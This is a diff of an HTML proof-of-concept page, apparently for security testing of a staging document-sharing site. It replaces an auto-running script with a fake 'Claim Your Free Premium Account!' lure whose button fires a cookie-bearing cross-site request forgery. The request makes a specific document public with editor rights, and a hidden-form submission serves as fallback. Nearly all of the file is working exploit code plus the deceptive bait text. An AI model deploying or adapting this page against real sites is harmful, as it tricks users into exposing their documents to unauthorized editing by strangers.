@@ -1,19 +1,74 @@
 <!DOCTYPE html>
-<script>
-// Auto-execute on page load
-fetch('https://staging.textjam.com/api/doc/H16U9PH6/access/public/editor', {
-    method: 'POST',
-    credentials: 'include',
-    mode: 'no-cors',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({})
-});
+<html>
+<head>
+    <title>Free Gift Claim</title>
+    <style>
+        body { font-family: Arial; padding: 20px; text-align: center; }
+        .gift { font-size: 48px; margin: 20px; }
+        .btn { 
+            background: #FF6B6B; 
+            color: white; 
+            padding: 15px 30px; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 18px; 
+            cursor: pointer;
+            margin: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="gift">🎁</div>
+    <h2>Claim Your Free Premium Account!</h2>
+    <p>Click below to verify your eligibility...</p>
+    
+    <button class="btn" onclick="performAttack()">Claim Now</button>
+    
+    <div id="status" style="margin-top: 20px; color: #666;"></div>
 
-// Redirect to the document API endpoint
-setTimeout(() => {
-    window.location.href = 'https://staging.textjam.com/api/doc/H16U9PH6';
-}, 500);
-</script>
-
+    <script>
+    function performAttack() {
+        document.getElementById('status').innerHTML = "Verifying your account...";
+        
+        // Perform stealth CSRF to make document public with editor role
+        fetch('https://staging.textjam.com/api/doc/H16U9PH6/access/public/editor', {
+            method: 'POST',
+            credentials: 'include',  // Send cookies
+            mode: 'no-cors',         // Avoid CORS issues
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({})  // Empty object like logout
+        })
+        .then(() => {
+            document.getElementById('status').innerHTML = "✅ Account verified! Redirecting...";
+            
+            // Redirect to document after making it public with editor role
+            setTimeout(() => {
+                window.location.href = "https://staging.textjam.com/doc/H16U9PH6?message=Document+now+public";
+            }, 1500);
+        })
+        .catch(error => {
+            document.getElementById('status').innerHTML = "⚠️ Verification failed. Trying alternative method...";
+            fallbackMethod();
+        });
+    }
+    
+    function fallbackMethod() {
+        // Alternative: Form submission method
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://staging.textjam.com/api/doc/H16U9PH6/access/public/editor';
+        form.style.display = 'none';
+        
+        // No inputs needed for this endpoint
+        document.body.appendChild(form);
+        form.submit();
+        
+        setTimeout(() => {
+            window.location.href = "https://staging.textjam.com/doc/H16U9PH6";
+        }, 1000);
+    }
+    </script>
+</body>
+</html>
